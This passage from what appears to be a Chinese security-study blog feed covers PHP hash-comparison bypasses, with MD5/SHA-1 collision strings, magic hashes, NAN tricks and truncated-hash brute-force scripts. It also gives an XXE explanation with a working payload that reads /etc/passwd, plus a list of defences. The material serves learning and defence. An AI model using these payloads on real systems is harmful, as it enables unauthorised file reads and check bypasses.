class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">02</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1%D5%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2<br><span class="hljs-variable">$b</span>=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">00</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1U%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="实验7"><a href="#实验7" class="headerlink" title="实验7"></a>实验7</h1><p><img src="/.com//image-20250417175005-bwx4402.png" alt="image"></p><p><img src="/.com//image-20250417175008-g6uw5ex.png" alt="image"></p><p>‍</p><p>文件：</p><p>linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">md5collgen -o <span class="hljs-number">1</span>.bin <span class="hljs-number">2</span>.bin<br></code></pre></td></tr></table></figure><p>windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">fastcoll.exe -p <span class="hljs-number">123</span>.txt -o <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="sha1碰撞："><a href="#sha1碰撞：" class="headerlink" title="sha1碰撞："></a>sha1碰撞：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">a=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>%<span class="hljs-number">7</span>FF%DC%<span class="hljs-number">93</span>%A6%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%AA%<span class="hljs-number">1</span>D%B2V%<span class="hljs-number">0</span>BE%CAg%D6%<span class="hljs-number">88</span>%C7%F8K%<span class="hljs-number">8</span>CLy%<span class="hljs-number">1</span>F%E0%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%F6%<span class="hljs-number">14</span>%F8m%B1i%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%C5kE%C1S%<span class="hljs-number">0</span>A%FE%DF%B7%<span class="hljs-number">608</span>%E9rr/%E7%ADr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EI%<span class="hljs-number">04</span>%E0F%C20W%<span class="hljs-number">0</span>F%E9%D4%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%AB%E1.%F5%BC%<span class="hljs-number">94</span>%<span class="hljs-number">2</span>B%E35B%A4%<span class="hljs-number">80</span>-%<span class="hljs-number">98</span>%B5%D7%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>A3.%C3%<span class="hljs-number">7</span>F%AC5%<span class="hljs-number">14</span>%E7M%DC%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>C%C1%A8t%CD%<span class="hljs-number">0</span>Cx0Z%<span class="hljs-number">21</span>Vda0%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%<span class="hljs-number">60</span>k%D0%BF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A8%<span class="hljs-number">04</span>F%<span class="hljs-number">29</span>%A1<br>b=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>sF%DC%<span class="hljs-number">91</span>f%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">11</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%B6%<span class="hljs-number">21</span>%B2V%<span class="hljs-number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="hljs-number">5</span>B%A8Ly%<span class="hljs-number">03</span>%<span class="hljs-number">0</span>C%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%E2%<span class="hljs-number">18</span>%F8m%B3%A9%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%D5%DFE%C1O%<span class="hljs-number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EE%BC%E0F%D2%<span class="hljs-number">3</span>CW%<span class="hljs-number">0</span>F%EB%<span class="hljs-number">14</span>%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%BBU.%F5%A0%A8%<span class="hljs-number">2</span>B%E31%FE%A4%<span class="hljs-number">807</span>%B8%B5%D7%<span class="hljs-number">1</span>F%<span class="hljs-number">0E3</span>.%DF%<span class="hljs-number">93</span>%AC5%<span class="hljs-number">00</span>%EBM%DC%<span class="hljs-number">0</span>D%EC%C1%A8dy%<span class="hljs-number">0</span>Cx%<span class="hljs-number">2</span>Cv%<span class="hljs-number">21</span>V%<span class="hljs-number">60</span>%DD0%<span class="hljs-number">97</span>%<span class="hljs-number">91</span>%D0k%D0%AF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A4%BCF%<span class="hljs-number">29</span>%B1<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h1><p><img src="/.com//image-20250417175035-pl0a3iz.png" alt="image"></p><p><img src="/.com//image-20250417175038-xd91avl.png" alt="image"></p><p>两个SHA1值相同而SHA256的值不同的pdf文件, <a href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a>和<a href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p><p>‍</p><h1 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a==md5($a)"></a>$a==md5($a)</h1><p>​<code>0e215962017</code>​的 <code>MD5</code>​ 值也是由 <code>0e</code>​ 开头，在 PHP 弱类型比较中等</p><p>‍</p><h1 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h1><p><img src="/.com//image-20250417175101-50g9dml.png" alt="image"></p><p><img src="/.com//image-20250417175105-z4p4lmw.png" alt="image"></p><p>‍</p><h1 id="NAN-和-INF"><a href="#NAN-和-INF" class="headerlink" title="NAN 和 INF"></a>NAN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是通过<code>var_dump</code>​查看数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串<code>NAN</code>​和字符串<code>INF</code>​使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>​都是false，但<code>md5(&#39;NaN&#39;)==md5(&#39;NAN&#39;)</code>​为true。</p><p>‍</p><h1 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h1><p><img src="/.com//image-20250417175117-ndyibgq.png" alt="image"></p><p><img src="/.com//image-20250417175121-hgvnlqn.png" alt="image"></p><p><img src="/.com//image-20250417175124-dql4g5j.png" alt="image"></p><p><img src="/.com//image-20250417175127-ivcykbh.png" alt="image"></p><p>可以使用<code>NAN</code>​绕过<code>md5()</code>​和<code>sha1()</code>​</p><p>‍</p><h1 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)===<span class="hljs-string">&#x27;8ffb1&#x27;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="MD5截断爆破"><a href="#MD5截断爆破" class="headerlink" title="MD5截断爆破"></a>MD5截断爆破</h2><p>给出一段<code>md5</code>​值要求找到匹配的原码。一般使用爆破脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php">import hashlib<br><span class="hljs-keyword">from</span> multiprocessing.dummy import Pool <span class="hljs-keyword">as</span> ThreadPool<br><br><br><span class="hljs-comment"># MD5截断数值已知 求原始数据</span><br><span class="hljs-comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span><br><br>def <span class="hljs-title function_ invoke__">md5</span>(ant):  <span class="hljs-comment"># 计算MD5字符串</span><br>    <span class="hljs-keyword">return</span> hashlib.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">str</span>(ant).<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><br><br>keymd5 = <span class="hljs-string">&#x27;8ffb1&#x27;</span>  <span class="hljs-comment"># 已知的md5截断值</span><br>md5start = <span class="hljs-number">0</span>  <span class="hljs-comment"># 设置题目已知的截断位置</span><br>md5length = <span class="hljs-number">5</span><br><br><br>def <span class="hljs-title function_ invoke__">findmd5</span>(sss):  <span class="hljs-comment"># 输入范围 里面会进行md5测试</span><br>    key = sss.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    start = <span class="hljs-keyword">int</span>(key[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 开始位置</span><br>    end = <span class="hljs-keyword">int</span>(key[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 结束位置</span><br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(start, end):<br>        <span class="hljs-comment"># print(md5(i)[md5start:md5length])</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">md5</span>(i)[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == keymd5:  <span class="hljs-comment"># 拿到加密字符串</span><br>            result = i<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&#x27;&#123;result&#125; &#123;md5(result)&#125;&#x27;</span>)  <span class="hljs-comment"># 打印</span><br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">list</span> = []  <span class="hljs-comment"># 参数列表</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">10</span>):  <span class="hljs-comment"># 多线程的数字列表 开始与结尾</span><br>    <span class="hljs-keyword">list</span>.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-title function_ invoke__">str</span>(<span class="hljs-number">10000000</span> * i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-title function_ invoke__">str</span>(<span class="hljs-number">10000000</span> * (i + <span class="hljs-number">1</span>)))<br><span class="hljs-comment"># print(list)</span><br>pool = <span class="hljs-title function_ invoke__">ThreadPool</span>()  <span class="hljs-comment"># 多线程任务</span><br>pool.<span class="hljs-title function_ invoke__">map</span>(findmd5, <span class="hljs-keyword">list</span>)  <span class="hljs-comment"># 函数 与参数列表</span><br>pool.<span class="hljs-title function_ invoke__">close</span>()<br>pool.<span class="hljs-title function_ invoke__">join</span>()<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417175151-7xw4wjg.png" alt="image"></p><p>‍</p><h2 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h2><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><br><br><span class="hljs-comment"># sha256截断数值已知 求原始数据</span><br><span class="hljs-comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">s</span>):  <span class="hljs-comment"># 计算sha256字符串</span><br>    <span class="hljs-keyword">return</span> hashlib.sha256(<span class="hljs-string">f&#x27;TQLCTF<span class="hljs-subst">&#123;s&#125;</span>&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br>keysha256 = <span class="hljs-string">&#x27;5625f&#x27;</span>  <span class="hljs-comment"># 已知的sha256截断值</span><br>sha256start = <span class="hljs-number">0</span>  <span class="hljs-comment"># 设置题目已知的截断位置</span><br>sha256length = <span class="hljs-number">5</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findsha256</span>(<span class="hljs-params">sss</span>):  <span class="hljs-comment"># 输入范围 里面会进行sha256测试</span><br>    key = sss.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    start = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 开始位置</span><br>    end = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 结束位置</span><br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end):<br>        <span class="hljs-comment"># print(sha256(i)[sha256start:sha256length])</span><br>        <span class="hljs-keyword">if</span> sha256(i)[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == keysha256:  <span class="hljs-comment"># 拿到加密字符串</span><br>            result = i<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;result&#125;</span> <span class="hljs-subst">&#123;sha256(result)&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 打印</span><br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-built_in">list</span> = []  <span class="hljs-comment"># 参数列表</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):  <span class="hljs-comment"># 多线程的数字列表 开始与结尾</span><br>    <span class="hljs-built_in">list</span>.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span> * i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span> * (i + <span class="hljs-number">1</span>)))<br>pool = ThreadPool()  <span class="hljs-comment"># 多线程任务</span><br>pool.<span class="hljs-built_in">map</span>(findsha256, <span class="hljs-built_in">list</span>)  <span class="hljs-comment"># 函数 与参数列表</span><br>pool.close()<br>pool.join()<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417175213-75wbvwu.png" alt="image"></p><p>‍</p><h1 id="array-search和is-array"><a href="#array-search和is-array" class="headerlink" title="array_search和is_array"></a>array_search和is_array</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">if</span> (!is_array($_GET[<span class="hljs-string">&#x27;test&#x27;</span>])) &#123;<br>    exit();<br>&#125;<br>$test = $_GET[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; count($test); $i++) &#123;<br>    <span class="hljs-keyword">if</span> ($test[$i] === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        echo <span class="hljs-string">&quot;error&quot;</span>;<br>        exit();<br>    &#125;<br>    $test[$i] = intval($test[$i]);<br>&#125;<br><span class="hljs-keyword">if</span> (array_search(<span class="hljs-string">&quot;admin&quot;</span>, $test) === <span class="hljs-number">0</span>) &#123;<br>    echo <span class="hljs-string">&quot;success&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    echo <span class="hljs-string">&quot;failed&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250417175225-hxln96p.png" alt="image"></p><p><img src="/.com//image-20250417175228-20igd3y.png" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP比较漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE（XML外部实体注入）</title>
    <link href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <url>/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE（XML外部实体注入）"><a href="#XXE（XML外部实体注入）" class="headerlink" title="XXE（XML外部实体注入）"></a>XXE（XML外部实体注入）</h1><h2 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h2><blockquote><p><strong>XXE（XML外部实体注入）</strong> 是一种针对应用程序<strong>处理XML数据</strong>的方式的攻击。在这种攻击中，攻击者<strong>利用应用程序</strong>对<strong>XML输入</strong>的<strong>处理不当</strong>，<strong>引入或“注入”</strong> 恶意内容。这可能<strong>导致未授权的数据访问、服务拒绝攻击甚至执行远程代码</strong>。</p></blockquote><p><img src="/.com//75546efaeffc13568dbf8842e9ee9cff-20250422220641-6fmtypu.png" alt="75546efaeffc13568dbf8842e9ee9cff">​</p><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><blockquote><p>&#x3D;&#x3D;XML（可扩展标记语言）&#x3D;&#x3D;是一种常用于Web应用程序的数据格式。XML文档可以&#x3D;&#x3D;定义实体&#x3D;&#x3D;，它们是存储文档中其他地方重复使用的数据的方式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。</p><p>XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。</p></blockquote><h2 id="XXE漏洞案例讲解"><a href="#XXE漏洞案例讲解" class="headerlink" title="XXE漏洞案例讲解"></a>XXE漏洞案例讲解</h2><h3 id="案例：读取服务器文件"><a href="#案例：读取服务器文件" class="headerlink" title="案例：读取服务器文件"></a>案例：读取服务器文件</h3><ul><li><strong>场景</strong>：一个Web应用程序允许用户上传XML文件来更新个人配置。</li><li><strong>攻击方法</strong>：攻击者创建一个XML文件，其中包含一个外部实体，该实体引用了服务器上的敏感文件（例如<code>/etc/passwd</code>​）。</li></ul><p><strong>XML示例</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>结果</strong>：当服务器处理此XML文件时，外部实体<code>xxe</code>​被解析，导致<code>/etc/passwd</code>​文件的内容被插入到XML文档中，并返回给攻击者。</p><p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="d93dbb9792be3727da5e6a2d56d6f996">​</p><h5 id="漏洞利用影响"><a href="#漏洞利用影响" class="headerlink" title="漏洞利用影响"></a>漏洞利用影响</h5><ul><li>攻击者可以读取服务器上的任意文件，这可能导致敏感信息泄露。</li><li>在某些情况下，攻击者还可以利用XXE漏洞发起服务拒绝（DoS）攻击，甚至执行远程代码。</li></ul><h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><ul><li><strong>禁用外部实体</strong>：在解析XML时禁用外部实体的处理。</li><li><strong>限制XML解析器功能</strong>：配置XML解析器，以最小化处理不必要功能，例如禁用DTD（文档类型定义）。</li><li><strong>输入验证</strong>：对输入的XML数据进行严格的验证，确保没有恶意构造的内容。</li><li><strong>错误处理</strong>：确保错误处理机制不会泄露敏感信息。</li></ul><p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="dc7b47612a2ffd945abc66ff52d915f7"></p><h4 id="XXE-的危害"><a href="#XXE-的危害" class="headerlink" title="XXE 的危害"></a>XXE 的危害</h4><ol><li><p><strong>敏感数据泄露</strong>：</p><ul><li>XXE攻击可以使攻击者读取服务器上的文件，包括配置文件、源代码、密码文件等，从而泄露敏感信息。</li></ul></li><li><p><strong>内部系统扫描</strong>：</p><ul><li>攻击者可以利用XXE攻击探测内部网络，识别内部服务和应用，从而为进一步的攻击提供信息。</li></ul></li></ol><ul><li><p><strong>服务器端请求伪造（SSRF）</strong> ：</p><ul><li>通过XXE攻击，攻击者可能能够迫使服务器与内部系统或外部服务器进行交互，可能导致数据泄露或其他安全问题。</li></ul></li><li><p><strong>执行远程代码和命令</strong>：</p><ul><li>在某些情况下，特别是当解析器支持强大的功能时，XXE攻击可以用于执行远程代码或系统命令，从而完全控制受影响的服务器。</li></ul></li><li><p><strong>拒绝服务攻击（DoS）</strong> ：</p><ul><li>XXE攻击可以用于发起拒绝服务攻击，例如通过指向大量消耗资源的外部实体或构造庞大的XML文档来耗尽服务器资源。</li></ul></li><li><p><strong>绕过防火墙</strong>：</p><ul><li>攻击者可以利用XXE漏洞绕过直接从外部网络访问内部网络资源的限制。</li></ul></li><li><p><strong>植入恶意内容</strong>：</p><ul><li>在某些情况下，XXE漏洞可以被用来植入恶意内容到系统中，影响数据的完整性。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE（XML外部实体注入）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2025/05/20/Web/SSRF/"/>
    <url>/2025/05/20/Web/SSRF/</url>
    
